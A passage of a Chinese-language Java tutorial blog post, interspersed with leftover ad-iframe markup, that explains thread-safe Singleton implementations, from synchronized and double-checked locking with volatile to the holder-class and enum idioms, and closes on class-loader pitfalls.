src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1086968807&amp;adf=2646140754&amp;pi=t.aa~a.425447425~i.22~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135591&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F265.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bj18QhN8A-FpXxGrDEhaszwEgLT6rxWGtPqoV4nx4u20Yac6fUemhMw_NiRnudTBnJEG1_M&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142022379&amp;bpp=1&amp;bdt=5051&amp;idt=0&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C704x280%2C704x280%2C1005x124&amp;nras=7&amp;correlator=1295508954388&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=26642487&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=3229&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=257&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788441%2C44792089&amp;oid=2&amp;psts=ABHeCvgx6APPkg0cJcI-3IR0CRFy-kpkOgrOHoCOSqwtPBl1UKZYuRhOLa0onR4ipxQoeyTUA9r748brn5TzyHrXsc_mbKk%2CABHeCvgUstwbJ4Zaj3ceouHlLaMDM7pa--4FCR9XtJYBzdYOrxe4dhymdv401BdaiEheNwKkWcZn5m0odA7WuONeb4JfxiOFoF19DHMV9PWv122oygNE-Q%2CABHeCvgBcy89S-AvPKFIshzASuLMCHb79LCfxNwx8ghhFNAxHl0p2oTEZrJQAIY7ZhP1UOwYbuXLxKDOLFFQM2bjZuC3AeQ6&amp;pvsid=1139274973973122&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=7&amp;uci=a!7&amp;btvi=4&amp;fsb=1&amp;xpc=jkATtY3AVg&amp;p=https%3A//coolshell.cn&amp;dtd=1043" data-google-container-id="a!7" data-google-query-id="CJTdr_j99v4CFdN3iwodPe0NEw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

<iframe id="aswift_8" name="aswift_8" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1086968807&amp;adf=3131932754&amp;pi=t.aa~a.425447425~i.23~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135591&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F265.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bj18QhN8A-FpXxGrDEhaszwEgLT6rxWGtPqoV4nx4u20Yac6fUemhMw_NiRnudTBnJEG1_M&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142022396&amp;bpp=1&amp;bdt=5068&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C704x280%2C704x280%2C1005x124%2C704x280&amp;nras=8&amp;correlator=1295508954388&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=26642487&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=3509&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=485&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788441%2C44792089&amp;oid=2&amp;psts=ABHeCvgx6APPkg0cJcI-3IR0CRFy-kpkOgrOHoCOSqwtPBl1UKZYuRhOLa0onR4ipxQoeyTUA9r748brn5TzyHrXsc_mbKk%2CABHeCvgUstwbJ4Zaj3ceouHlLaMDM7pa--4FCR9XtJYBzdYOrxe4dhymdv401BdaiEheNwKkWcZn5m0odA7WuONeb4JfxiOFoF19DHMV9PWv122oygNE-Q%2CABHeCvgBcy89S-AvPKFIshzASuLMCHb79LCfxNwx8ghhFNAxHl0p2oTEZrJQAIY7ZhP1UOwYbuXLxKDOLFFQM2bjZuC3AeQ6&amp;pvsid=1139274973973122&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=9&amp;uci=a!9&amp;btvi=5&amp;fsb=1&amp;xpc=PmleilH4YF&amp;p=https%3A//coolshell.cn&amp;dtd=1046" data-google-container-id="a!9" data-google-query-id="CPaRsfj99v4CFWvHTAIdf9IDGA" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

嗯，使用了Java的synchronized方法，看起来不错哦。应该没有问题了吧？！错！这还是有问题！为什么呢？前面已经说过，如果有多个线程同时通过(singleton== null)的条件检查（因为他们并行运行），虽然我们的synchronized方法会帮助我们同步所有的线程，让我们并行线程变成串行的一个一个去new，那不还是一样的吗？同样会出现很多实例。嗯，确实如此！看来，还得把那个判断(singleton== null)条件也同步起来。于是，我们的Singleton再次升级成1.2版本，如下所示：

// version 1.2

**public** **class** Singleton

{

​    **private** **static** Singleton singleton = **null**;

​    **private** Singleton()  {  }

​    **public** **static** Singleton getInstance()  {

​        **synchronized** (Singleton.class) {

​            **if** (singleton== **null**) {

​    singleton= new Singleton();

​            }

​         }

​        **return** singleton;

​    }

}

<iframe id="aswift_3" name="aswift_3" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1086968807&amp;adf=2646140754&amp;pi=t.aa~a.425447425~i.27~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135591&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F265.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bj18QhN8A-FpXxGrDEhaszwEgLT6rxWGtPqoV4nx4u20Yac6fUemhMw_NiRnudTBnJEG1_M&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142022350&amp;bpp=1&amp;bdt=5022&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C704x280%2C704x280%2C1005x124%2C704x280%2C704x280&amp;nras=9&amp;correlator=1295508954388&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=26642487&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=4295&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=1271&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788441%2C44792089&amp;oid=2&amp;psts=ABHeCvgx6APPkg0cJcI-3IR0CRFy-kpkOgrOHoCOSqwtPBl1UKZYuRhOLa0onR4ipxQoeyTUA9r748brn5TzyHrXsc_mbKk%2CABHeCvgUstwbJ4Zaj3ceouHlLaMDM7pa--4FCR9XtJYBzdYOrxe4dhymdv401BdaiEheNwKkWcZn5m0odA7WuONeb4JfxiOFoF19DHMV9PWv122oygNE-Q%2CABHeCvgBcy89S-AvPKFIshzASuLMCHb79LCfxNwx8ghhFNAxHl0p2oTEZrJQAIY7ZhP1UOwYbuXLxKDOLFFQM2bjZuC3AeQ6%2CABHeCvj2Eii7rkIz4SRZJW6KDubsURHCBSU85o-XYDqYEo_RgIYP7RQxillBdDzp3jLDdise9jyz-sma0CJlAOtU_4IXSGgT%2CABHeCvgS3FZ8tRsq_8gY5loi1gKWXdlrzSABCQQkKTGAty8l_YX2JA70bznlcb8vGnSoC1IPamikfyFE5c0oEHS--DSwQCKS%2CABHeCvjTQvOaZ7CRFJ2phMfM6Ty92idOZqol1Qo69L3Ilfk6faCLu0bqwL5d2KddzmhTLHp_b7JlhHgM9uAUnh_MWrRYFstB&amp;pvsid=1139274973973122&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=4&amp;uci=a!4&amp;btvi=6&amp;fsb=1&amp;xpc=KIkaUVCWIk&amp;p=https%3A//coolshell.cn&amp;dtd=8372" data-google-container-id="a!4" data-google-query-id="CIrB7fv99v4CFZoPYAodg2kC8Q" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

不错不错，看似很不错了。在多线程下应该没有什么问题了，不是吗？的确是这样的，1.2版的Singleton在多线程下的确没有问题了，因为我们同步了所有的线程。只不过嘛……，什么？！还不行？！是的，还是有点小问题，我们本来只是想让new这个操作并行就可以了，现在，只要是进入getInstance()的线程都得同步啊，注意，创建对象的动作只有一次，后面的动作全是读取那个成员变量，这些读取的动作不需要线程同步啊。这样的作法感觉非常极端啊，为了一个初始化的创建动作，居然让我们达上了所有的读操作，严重影响后续的性能啊！

还得改！嗯，看来，在线程同步前还得加一个(singleton== null)的条件判断，如果对象已经创建了，那么就不需要线程的同步了。OK，下面是1.3版的Singleton。

// version 1.3

**public** **class** Singleton

{

​    **private** **static** Singleton singleton = **null**;

​    **private** Singleton()  {    }

​    **public** **static** Singleton getInstance() {

​        **if** (singleton== **null**)  {

​            **synchronized** (Singleton.class) {

​                **if** (singleton== **null**)  {

​                    singleton= new Singleton();

​                }

​            }

​        }

​        **return** singleton;

​    }

}

<iframe id="aswift_7" name="aswift_7" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1086968807&amp;adf=1625143018&amp;pi=t.aa~a.425447425~i.34~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135591&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F265.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bj18QhN8A-FpXxGrDEhaszwEgLT6rxWGtPqoV4nx4u20Yac6fUemhMw_NiRnudTBnJEG1_M&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142022388&amp;bpp=1&amp;bdt=5060&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C704x280%2C704x280%2C1005x124%2C704x280%2C704x280%2C704x280&amp;nras=10&amp;correlator=1295508954388&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=26642487&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=5227&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=2181&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788441%2C44792089&amp;oid=2&amp;psts=ABHeCvgx6APPkg0cJcI-3IR0CRFy-kpkOgrOHoCOSqwtPBl1UKZYuRhOLa0onR4ipxQoeyTUA9r748brn5TzyHrXsc_mbKk%2CABHeCvgUstwbJ4Zaj3ceouHlLaMDM7pa--4FCR9XtJYBzdYOrxe4dhymdv401BdaiEheNwKkWcZn5m0odA7WuONeb4JfxiOFoF19DHMV9PWv122oygNE-Q%2CABHeCvgBcy89S-AvPKFIshzASuLMCHb79LCfxNwx8ghhFNAxHl0p2oTEZrJQAIY7ZhP1UOwYbuXLxKDOLFFQM2bjZuC3AeQ6%2CABHeCvj2Eii7rkIz4SRZJW6KDubsURHCBSU85o-XYDqYEo_RgIYP7RQxillBdDzp3jLDdise9jyz-sma0CJlAOtU_4IXSGgT%2CABHeCvgS3FZ8tRsq_8gY5loi1gKWXdlrzSABCQQkKTGAty8l_YX2JA70bznlcb8vGnSoC1IPamikfyFE5c0oEHS--DSwQCKS%2CABHeCvjTQvOaZ7CRFJ2phMfM6Ty92idOZqol1Qo69L3Ilfk6faCLu0bqwL5d2KddzmhTLHp_b7JlhHgM9uAUnh_MWrRYFstB%2CABHeCvg8PhItSWT93CvFBrxEL9iDXkyCKJ3hRF367uOieIJEdIWgLGR_fkhen-re5uzStuovuvv_NmCosCgogTwhtig5O9g3&amp;pvsid=1139274973973122&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=8&amp;uci=a!8&amp;btvi=7&amp;fsb=1&amp;xpc=wrL9mEUZnM&amp;p=https%3A//coolshell.cn&amp;dtd=8784" data-google-container-id="a!8" data-google-query-id="CL73iPz99v4CFcxiYAode6gGFw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

<iframe id="aswift_4" name="aswift_4" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1086968807&amp;adf=2209410931&amp;pi=t.aa~a.425447425~i.35~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135591&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F265.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bj18QhN8A-FpXxGrDEhaszwEgLT6rxWGtPqoV4nx4u20Yac6fUemhMw_NiRnudTBnJEG1_M&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142022360&amp;bpp=1&amp;bdt=5032&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C704x280%2C704x280%2C1005x124%2C704x280%2C704x280%2C704x280%2C704x280&amp;nras=11&amp;correlator=1295508954388&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=26642487&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=5507&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=2481&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788441%2C44792089&amp;oid=2&amp;psts=ABHeCvgx6APPkg0cJcI-3IR0CRFy-kpkOgrOHoCOSqwtPBl1UKZYuRhOLa0onR4ipxQoeyTUA9r748brn5TzyHrXsc_mbKk%2CABHeCvgUstwbJ4Zaj3ceouHlLaMDM7pa--4FCR9XtJYBzdYOrxe4dhymdv401BdaiEheNwKkWcZn5m0odA7WuONeb4JfxiOFoF19DHMV9PWv122oygNE-Q%2CABHeCvgBcy89S-AvPKFIshzASuLMCHb79LCfxNwx8ghhFNAxHl0p2oTEZrJQAIY7ZhP1UOwYbuXLxKDOLFFQM2bjZuC3AeQ6%2CABHeCvj2Eii7rkIz4SRZJW6KDubsURHCBSU85o-XYDqYEo_RgIYP7RQxillBdDzp3jLDdise9jyz-sma0CJlAOtU_4IXSGgT%2CABHeCvgS3FZ8tRsq_8gY5loi1gKWXdlrzSABCQQkKTGAty8l_YX2JA70bznlcb8vGnSoC1IPamikfyFE5c0oEHS--DSwQCKS%2CABHeCvjTQvOaZ7CRFJ2phMfM6Ty92idOZqol1Qo69L3Ilfk6faCLu0bqwL5d2KddzmhTLHp_b7JlhHgM9uAUnh_MWrRYFstB%2CABHeCvg8PhItSWT93CvFBrxEL9iDXkyCKJ3hRF367uOieIJEdIWgLGR_fkhen-re5uzStuovuvv_NmCosCgogTwhtig5O9g3%2CABHeCvjcMRXF9UrLN4JJIEEZFcyK0scWsVweeGTBXFu7YbdZ3TdZV5wMzJ7sRZOO8PCOOEUtG7w-Zd-VBD0xd-S7RYKtLbVv&amp;pvsid=1139274973973122&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=5&amp;uci=a!5&amp;btvi=8&amp;fsb=1&amp;xpc=AIA6ilU98f&amp;p=https%3A//coolshell.cn&amp;dtd=9128" data-google-container-id="a!5" data-google-query-id="COmKnPz99v4CFRiEwgod-0cBDw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

感觉代码开始变得有点罗嗦和复杂了，不过，这可能是最不错的一个版本了，这个版本又叫“双重检查”Double-Check。下面是说明：

1. 第一个条件是说，如果实例创建了，那就不需要同步了，直接返回就好了。
2. 不然，我们就开始同步线程。
3. 第二个条件是说，如果被同步的线程中，有一个线程创建了对象，那么别的线程就不用再创建了。

相当不错啊，干得非常漂亮！请大家为我们的1.3版起立鼓掌！

但是，如果你认为这个版本大攻告成，你就错了。

主要在于**singleton `= new Singleton()`**这句，这并非是一个原子操作，事实上在 JVM 中这句话大概做了下面 3 件事情。

1. 给 singleton 分配内存
2. 调用 Singleton 的构造函数来初始化成员变量，形成实例
3. 将singleton对象指向分配的内存空间（执行完这步 singleton才是非 null 了）

但是在 JVM 的即时编译器中存在指令重排序的优化。也就是说上面的第二步和第三步的顺序是不能保证的，最终的执行顺序可能是 1-2-3 也可能是 1-3-2。如果是后者，则在 3 执行完毕、2 未执行之前，被线程二抢占了，这时 instance 已经是非 null 了（但却没有初始化），所以线程二会直接返回 instance，然后使用，然后顺理成章地报错。

对此，我们只需要把singleton声明成 volatile 就可以了。下面是1.4版：

// version 1.4

**public** **class** Singleton

{

​    **private** **volatile** **static** Singleton singleton = **null**;

​    **private** Singleton()  {    }

​    **public** **static** Singleton getInstance()   {

​        **if** (singleton== **null**)  {

​            **synchronized** (Singleton.class) {

​                **if** (singleton== **null**)  {

​                    singleton= new Singleton();

​                }

​            }

​        }

​        **return** singleton;

​    }

}

使用 volatile 有两个功用：

1）这个变量不会在多个线程中存在复本，直接从内存读取。

2）这个关键字会禁止指令重排序优化。也就是说，在 volatile 变量的赋值操作后面会有一个内存屏障（生成的汇编代码上），读操作不会被重排序到内存屏障之前。

但是，这个事情仅在Java 1.5版后有用，1.5版之前用这个变量也有问题，因为老版本的Java的内存模型是有缺陷的。

#### **Singleton 的简化版本**

上面的玩法实在是太复杂了，一点也不优雅，下面是一种更为优雅的方式：

这种方法非常简单，因为单例的实例被声明成 static 和 final 变量了，在第一次加载类到内存中时就会初始化，所以创建实例本身是线程安全的。

// version 1.5

**public** **class** Singleton

{

​    **private** **volatile** **static** Singleton singleton = new Singleton();

​    **private** Singleton()  {    }

​    **public** **static** Singleton getInstance()   {

​        **return** singleton;

​    }

}

但是，这种玩法的最大问题是——当这个类被加载的时候，new Singleton() 这句话就会被执行，就算是getInstance()没有被调用，类也被初始化了。

于是，**这个可能会与我们想要的行为不一样，比如，我的类的构造函数中，有一些事可能需要依赖于别的类干的一些事（比如某个配置文件，或是某个被其它类创建的资源），我们希望他能在我第一次getInstance()时才被真正的创建。这样，我们可以控制真正的类创建的时刻，而不是把类的创建委托给了类装载器**。

好吧，我们还得绕一下：

下面的这个1.6版是老版《Effective Java》中推荐的方式。

// version 1.6

**public** **class** Singleton {

​    **private** **static** **class** SingletonHolder {

​        **private** **static** **final** Singleton INSTANCE = new Singleton();

​    }

​    **private** Singleton (){}

​    **public** **static** **final** Singleton getInstance() {

​        **return** SingletonHolder.INSTANCE;

​    }

}

上面这种方式，仍然使用JVM本身机制保证了线程安全问题；由于 SingletonHolder 是私有的，除了 getInstance() 之外没有办法访问它，因此它只有在getInstance()被调用时才会真正创建；同时读取实例的时候不会进行同步，没有性能缺陷；也不依赖 JDK 版本。

#### **Singleton 优雅**版本

**public** **enum** Singleton{

   INSTANCE;

}

居然用枚举！！看上去好牛逼，通过EasySingleton.INSTANCE来访问，这比调用getInstance()方法简单多了。

默认枚举实例的创建是线程安全的，所以不需要担心线程安全的问题。但是在枚举中的其他任何方法的线程安全由程序员自己负责。还有防止上面的通过反射机制调用私用构造器。

**这个版本基本上消除了绝大多数的问题。代码也非常简单，实在无法不用。这也是新版的《Effective Java》中推荐的模式。**

#### **Singleton的其它问题**

怎么？还有问题？！当然还有，请记住下面这条规则——“**无论你的代码写得有多好，其只能在特定的范围内工作，超出这个范围就要出Bug了**”，这是“陈式第一定理”，呵呵。你能想一想还有什么情况会让这个我们上面的代码出问题吗？

在C++下，我不是很好举例，但是在Java的环境下，嘿嘿，还是让我们来看看下面的一些反例和一些别的事情的讨论（**当然，有些反例可能属于钻牛角尖，可能有点学院派，不过也不排除其实际可能性，就算是提个醒吧**）：

**其一、Class Loader**。不知道你对Java的Class Loader熟悉吗？“类装载器”？！C++可没有这个东西啊。这是Java动态性的核心。顾名思义，类装载器是用来把类(class)装载进JVM的。JVM规范定义了两种类型的类装载器：启动内装载器(bootstrap)和用户自定义装载器(user-defined class loader)。 在一个JVM中可能存在多个ClassLoader，每个ClassLoader拥有自己的NameSpace。一个ClassLoader只能拥有一个class对象类型的实例，但是不同的ClassLoader可能拥有相同的class对象实例，这时可能产生致命的问题。如ClassLoaderA，装载了类A的类型实例A1，而ClassLoaderB，也装载了类A的对象实例A2。逻辑上讲A1=A2，但是由于A1和A2来自于不同的ClassLoader，它们实际上是完全不同的，如果A中定义了一个静态变量c，则c在不同的ClassLoader中的值是不同的。

于是，如果咱们的Singleton 1.3版本如果面对着多个Class Loader会怎么样？呵呵，多个实例同样会被多个Class Loader创建出来，当然，这个有点牵强，不过他确实存在。难道我们还要整出个1.4版吗？可是，我们怎么可能在我的Singleton类中操作Class Loader啊？是的，你根本不可能。在这种情况下，你能做的只有是——“保证多个Class Loader不会装载同一个Singleton”。

